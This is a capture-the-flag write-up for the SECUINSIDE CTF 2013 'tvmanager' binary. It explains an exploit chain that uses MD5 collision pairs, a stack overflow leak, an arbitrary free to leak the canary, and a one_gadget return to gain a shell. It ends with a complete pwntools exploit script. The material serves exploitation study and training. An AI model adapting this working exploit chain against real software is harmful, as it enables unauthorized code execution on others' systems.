+++
title = "SECUINSIDE CTF 2013 - tvmanager"
date = "2024-07-23"
description = "SECUINSIDE CTF 2013 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "md5 collision", "bof", "arbitrary free", "one gadget"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/tvmanager'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structure
``` c
struct movie {
    int size;
    int category;
    char *name;
    struct movie *next;
    struct movie *prev;
}
```

### Concept
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  read(0, name, 0x20u);
  name_len = strlen(name);
  md5_1FAE((int)name, name_len, (int)name_md5);
  sprintf(src, "/home/tvmanager/%s", name_md5);
  mkdir(src, 0x1F0u);
  if ( chdir(src) != -1 ) {
    while ( 1 ) {
    load_movies_145F();
      print_list_214E((int)menu_list_409C);
      printf("> ");
      _isoc99_scanf("%d", &choice);
      if ( choice == 1 ) list_1821();
      if ( choice == 2 ) register_18B0();
      if ( choice == 3 ) broadcast_1DA7();
      if ( choice == 4 ) exit(0);
    }
  }
  return -1;
}
```

The input name is hashed with `md5` to create a path, and every time a `movie` is registered, a file is created under the path with the hash value of `movie->name` to store the contents.


## 0x01. Vulnerability
### MD5 collision
There are several vulnerabilities and we need to exploit them comprehensively, but the first thing to look at is MD5 collision.

A collision refers to a phenomenon where different input strings produce the same value in hash function, and a pair of such inputs is called a collision pair.
An example found through googling is as follows:

``` python
# md5 collision - 79054025255fb1a26e4bc422aef54eb4
a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')
```

They look roughly similar, but if you look closely, a few bytes are different here and there.
As a side note, when **a few bytes that differ here and there** are `\x00` or `\xff`, it becomes quite troublesome because they get cut off during `strcpy()` or `fread()` processes in the binary, so it's good to find collision pairs that avoid these well.

When we register a `movie` with collision pairs that have the same hash value as names:

``` c
int register_18B0()
{
  ...
  printf("Input title of movie > ");
  read(0, src, 256u);
  ...
    if ( !strcmp(movie_ptr->name, src) )
    {
      puts("[-] Duplicate title");
      return -1;
    }
    ...
      name_ptr = (size_t)malloc(src_len + 1);
      movie_new = (struct movie *)malloc(0x14u);
      movie_new->name = (char *)name_ptr;
      strcpy(movie_new->name, src);
      name_len = strlen(movie_new->name);
      md5_1FAE((int)movie_new->name, name_len, (int)src);
      fd = fopen(src, "wb");
      fwrite(contents, 1u, movie_new->size, fd);
      fclose(fd);
    ...
}
```

Since the input strings are different, the `strcmp(movie_ptr->name, src)` check passes, and since the hashed values are the same, the same file is opened at `fd = fopen(src, "wb")`.

This allows us to trigger the next vulnerability.

### Stack Overflow & Leak
Let's assume that the first `movie_1` has a `size` of 0x4, and the second `movie_2` has a `size` of 0x1000.

``` c
int broadcast_1DA7()
{
  ...
  char stack_buf[1024]; // [esp+24h] [ebp-414h] BYREF
  size_t size; // [esp+424h] [ebp-14h]
  void *contents; // [esp+428h] [ebp-10h]
  unsigned int canary; // [esp+42Ch] [ebp-Ch]
  ...
    canary = __readgsdword(0x14u);
    md5_1FAE((int)movie_ptr->name, v1, (int)src);
    fd = fopen(src, "rb");
    if ( size > 0x3ff ) {
      contents = malloc(size + 1);
      fread(contents, 1u, size, fd);
      sock_send_2038(contents, movie_ptr->size);
    }
    else {
      for ( i = 0; ; ++i )
      {
        tmp = fgetc(fd);
        if ( tmp == (char)'\xFF' )
          break;
        stack_buf[i] = tmp;
      }
      sock_send_2038(stack_buf, movie_ptr->size);
    }
  ...
}
```

Then when we `broadcast` with `movie_1`, since `size` is 0x4, it reads the file contents into `stack_buf` and copies byte by byte.
However, since we created `movie_1` and then created `movie_2`, the file currently has 0x1000 bytes of content written.
In the above code, it copies to `stack_buf` until `\xff` appears, so we can overwrite not only `size` and `contents` after `stack_buf`, but even the return address.

We can either cause an overflow or leak other values this way.
Now let's assume a situation where `movie_1` has a `size` of 0x3ff and `movie_2` has a `size` of 0x400.
If we make the first byte of `movie_2`'s content `\xff`, copying ends immediately and we can see the stack memory without changing a single byte.

``` bash
gef➤  x/4wx $esp+0x24
0xffffd864:     0x5655b6a0      0x5655b210      0x41414141      0x41414141
...
0xffffdc70:     0xf7dde000      0xf7dde000      0xffffdcf8      0x56556438
```

Looking at the stack values at the point of copying, there are many attractive values written during other operations, and we can leak `stack`, `libc`, `code`, and `heap` areas with a single leak.

The problem is the `canary`.
While we need a stack leak for this, the vulnerability doesn't hold if `movie_1`'s `size` is greater than 0x3ff, so this method is impossible.
Therefore, another vulnerability is required.

### Arbitrary Free
``` c
int broadcast_1DA7()
{
  ...
  char stack_buf[1024]; // [esp+24h] [ebp-414h] BYREF
  size_t size; // [esp+424h] [ebp-14h]
  void *contents; // [esp+428h] [ebp-10h]
...
      for ( i = 0; ; ++i )
      {
        tmp = fgetc(fd);
        if ( tmp == (char)'\xFF' )
          break;
        stack_buf[i] = tmp;
      }
    ...
    if ( size > 0x3ff )
      free(contents);
    ...
}
```

Using the previous stack overflow vulnerability, we can manipulate `size` and `contents`.

If the previous leak was performed well, there's a heap address, so by manipulating `size` to a value greater than 0x3ff and calculating the offset to manipulate the `contents` value, we can `free()` any chunk in the heap.
The chunk freed this way goes to a bin and is reused as is when there's a `malloc()` request for the same size, so if we look for a place where we can `malloc()` the length we want:

``` c
int register_18B0()
{
  ...
  read(0, src, 256u);
      ...
      name_ptr = (size_t)malloc(src_len + 1);
      movie_new->name = (char *)name_ptr;
      strcpy(movie_new->name, src);
      ...
}
```

In `register()`, we can control the size of `name_ptr` for storing the `movie` name, and we can also input the content.
We'll use this to leak the `canary`.

After that, we can use the stack overflow vulnerability again to control eip.


## 0x02. Exploit
### Stack Leak
The first thing to do is stack leak using md5 collision.

``` python
    # md5 collision - 79054025255fb1a26e4bc422aef54eb4
    a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
    a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')

    # stack, heap, libc leak
    register(s, a1, 1, 0x3ff, b"A" * 0x3ff)          # index 1
    register(s, a2, 1, 0x400, b"\xff" * 0x400)       # index 2

    l = listen(7777)
    broadcast(s, 1, 0, 1, 7777)
    r = l.recv()
```

By creating `movie_1` as 0x3ff and `movie_2` as 0x400, and making `movie_2`'s content `\xff` so that not a single byte is copied, we can leak 0x3ff bytes of uncontaminated stack from `stack_buf`.

Since it sends via socket by specifying IP and port with `broadcast` instead of just printing the content, I used pwntools' `listen()`.

``` bash
[+] Trying to bind to :: on port 7777: Done
[+] Waiting for connections on :::7777: Got connection from ::ffff:172.17.0.2 on port 39690
[*] heap : 0x5655a000
[*] stack : 0xffffdc48
[*] libc : 0xf7c2b000
```

### Arbitrary Free
Now we need to trigger arbitrary free based on the leaked values.
Although it's basically the same vulnerability, since it's difficult to reuse the collision pair, I used a new collision pair.

``` python
    # md5 collision - cee9a457e790cf20d4bdaa6d69f01e41
    b1 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    b2 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef')

    # free(movie_1)
    register(s, b1, 1, 0x4, b"BBBB")                # index 3
    payload = b"C" * 0x400                          # buf
    payload += p32(0x400)                           # size
    payload += p32(heap + 0x11f8)                   # contents, movie_1
    register(s, b2, 1, len(payload), payload)       # index 4

    broadcast(s, 3, 0, 1, 7777)
```

As in the above payload, I manipulated `size` to 0x400 for `free` and manipulated the `contents` value to free `movie_1`.
To reallocate this freed chunk:

``` python
    # canary leak
    payload = b"DDDD"                   # size
    payload += b"\xff\xff\xff\xff"      # category
    payload += p32(stack + 0xa5)        # name, canary
    payload += p32(heap + 0x16a0)       # next, movie_2
    payload += b"EEE\x00"               # prev
    register(s, payload, 1, 0x4, b"XXXX")           # index 5
```

I wrote the payload so that `name` has the same structure as `struct movie` and executed `register`.

At this time, I was going to just set the `category` value to 1(`\x01\x00\x00\x00`), but since it's copied to `name` through `strcpy(movie_new->name, src);`, the payload after cuts off if there's `\x00` in the middle.
If I fill the `category` value with a dummy value like 0x41414141, an OOB error occurs in `list` which is executed for the leak.

``` c
int list_1821()
{
  ...
  while ( movie_ptr )
  {
    printf("%d )\nTitile : %s\nCategory : %s\n", count + 1, movie_ptr->name, category_list_40B0[movie_ptr->category]);
    movie_ptr = (struct movie *)movie_ptr->next_movie;
    ++count;
  }
  ...
}
```

So I overwrote it with `\xff\xff\xff\xff` meaning -1 to solve both constraints at once.
In this state, when `list` is called, since `movie_ptr->name` points to the canary's address, canary leak is possible.

``` bash
[*] canary : 0x72657400
```

### EIP Control
Now that we have all the necessary information, eip control is possible.
So I set the return address to a usable address through one_gadget.

Then the final payload is as follows:

``` python
    # md5 collision - fe6c446ee3a831ee010f33ac9c1b602c
    c1 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD939C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1C3991DCD91C845E66EFD3DC7BB61523EF4E03849118569EBCC179C934F40EB3302AD20A4092DFB15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDE424F46C278759D8B65F450EA21C5591862FF7B')
    c2 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD9B9C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1439A1DCD91C845E66EFD3DC7BB61D23EF4E03849118569EBCC179C934F40EB3302AD20A4092D7B15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDEC24E46C278759D8B65F450EA21C5D91862FF7B')

    # eip control
    register(s, c1, 1, 0x4, b"FFFF")                # index 6
    payload = b"G" * 0x400              # buf
    payload += p32(0)                   # size
    payload += p32(0)                   # contents
    payload += p32(canary)              # canary
    payload += b"H" * 0xc               # dummy
    payload += p32(libc + 0x5fbd5)      # return
    register(s, c2, 1, len(payload), payload)       # index 7

    broadcast(s, 6, 0, 1, 7777)
```

We need another pair of collision, and by adding the offset of one shot gadget to the leaked libc address and writing it to the return address, we can execute a shell.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os, socket, threading

DEBUG = True
BINARY = "tvmanager"
LIBRARY = "libc-2.23.so"

code_base = 0x56555000
movie_4100 = 0x56559100
src_4120 = 0x56559120
bp = {
    'read_of_main' : code_base + 0x134B,
    'scanf_of_main' : code_base + 0x13F7,
    'load_movies' : code_base + 0x145F,
    'list' : code_base + 0x1821,
    'register' : code_base + 0x18B0,
    'md5_of_register' : code_base + 0x1BB1,
    'strlen_of_register' : code_base + 0x1B17,
    'broadcast' : code_base + 0x1DA7,
    'malloc_of_broadcast' : code_base + 0x1F1F,
    'end_of_broadcast' : code_base + 0x1FAC,
    'sizecheck_of_broadcast' : code_base + 0x1F86,
}
gs = f'''
b *{bp['scanf_of_main']}
b *{bp["end_of_broadcast"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def login(s, name):
    s.recvuntil(b"> ")
    s.send(name)
    return s.recvuntil(b"> ")

def _list(s):
    s.sendline(b"1")
    sleep(0.1)
    return s.recvuntil(b"> ")

def register(s, title, category, size, contents):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.send(title)
    s.recvuntil(b"> ")
    s.sendline(str(category).encode())
    s.recvuntil(b"> ")
    s.send(str(size).encode())
    sleep(0.1)
    s.send(contents)
    return s.recv()

def broadcast(s, index, floor, room, channel):
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    s.recvuntil(b"> ")
    s.sendline(f"{floor}-{room}-{channel}".encode())
    return s.recv(timeout=5)

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    login(s, os.urandom(4))
    # md5 collision - 79054025255fb1a26e4bc422aef54eb4
    a1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
    a2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')
    # md5 collision - cee9a457e790cf20d4bdaa6d69f01e41
    b1 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    b2 = bytes.fromhex('0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef')
    # md5 collision - fe6c446ee3a831ee010f33ac9c1b602c
    c1 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD939C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1C3991DCD91C845E66EFD3DC7BB61523EF4E03849118569EBCC179C934F40EB3302AD20A4092DFB15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDE424F46C278759D8B65F450EA21C5591862FF7B')
    c2 = bytes.fromhex('3775C1F1C4A75AE79CE0DE7A5B10802602ABD9B9C96C5F0212C27FDACD0DA3B08CEDFAF3E1A3FDB4EF09E7FBB1439A1DCD91C845E66EFD3DC7BB61D23EF4E03849118569EBCC179C934F40EB3302AD20A4092D7B15FA201DD1DB17CDDD29591E39899EF679469FE68B85C5EFDEC24E46C278759D8B65F450EA21C5D91862FF7B')

    # stack, heap, libc leak
    register(s, a1, 1, 0x3ff, b"A" * 0x3ff)         # index 1
    register(s, a2, 1, 0x400, b"\xff" * 0x400)      # index 2

    l = listen(7777)
    broadcast(s, 1, 0, 1, 7777)
    r = l.recv()

    heap = u32(r[0:4]) - 0x16a0
    stack = u32(r[0x324:0x328])
    libc = u32(r[0x320:0x324]) - 0x1b3da7
    log.info(f"heap : {hex(heap)}")
    log.info(f"stack : {hex(stack)}")
    log.info(f"libc : {hex(libc)}")

    # free(movie_1)
    register(s, b1, 1, 0x4, b"BBBB")                # index 3
    payload = b"C" * 0x400              # buf
    payload += p32(0x400)               # size
    payload += p32(heap + 0x11f8)       # contents, movie_1
    register(s, b2, 1, len(payload), payload)       # index 4

    broadcast(s, 3, 0, 1, 7777)

    # canary leak
    payload = b"DDDD"                   # size
    payload += b"\xff\xff\xff\xff"      # category
    payload += p32(stack + 0xa5)        # name
    payload += p32(heap + 0x16a0)       # next
    payload += b"EEE\x00"               # prev
    register(s, payload, 1, 0x4, b"XXXX")           # index 5

    r = _list(s)
    canary = u32(b"\x00" + r[0x3a:0x3d])
    log.info(f"canary : {hex(canary)}")

    # eip control
    register(s, c1, 1, 0x4, b"FFFF")                # index 6
    payload = b"G" * 0x400              # buf
    payload += p32(0)                   # size
    payload += p32(0)                   # contents
    payload += p32(canary)              # canary
    payload += b"H" * 0xc               # dummy
    payload += p32(libc + 0x5fbd5)      # return
    register(s, c2, 1, len(payload), payload)       # index 7
    
    broadcast(s, 6, 0, 1, 7777)
    
    s.interactive()

if __name__=='__main__':
    main()
```